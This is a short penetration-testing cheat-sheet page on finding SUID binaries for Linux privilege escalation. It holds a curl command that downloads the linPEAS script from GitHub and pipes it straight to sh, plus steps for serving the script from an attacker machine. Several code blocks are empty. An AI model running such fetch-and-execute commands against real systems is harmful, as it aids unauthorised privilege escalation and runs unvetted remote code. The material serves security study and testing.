# SUID Abuse

## Finding Vulnerable Binaries

### Option 1: Find Command

The find command can show files owned by root that have the SUID bit set. Redirect errors to /dev/null since there will be a lot of permissions errors.

```text

```

### Option 2: Privilege Escalation Awesome Scripts \(PEASS\)

PEASS makes it easily to check for a wide range of privesc conditions. If the target machine cannot download it directly from github, serve it from a web server on your attacker machine.

{% tabs %}
{% tab title="Github" %}
```bash
# download  from Github and execute immediately
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```
{% endtab %}

{% tab title="Python 2" %}
```bash
# On the attacking machine
python -m SimpleHTTPServer 80


# On the victim machine

```
{% endtab %}

{% tab title="Python 3" %}
```
# On the attacking machine
python -m http.server 80
```
{% endtab %}
{% endtabs %}

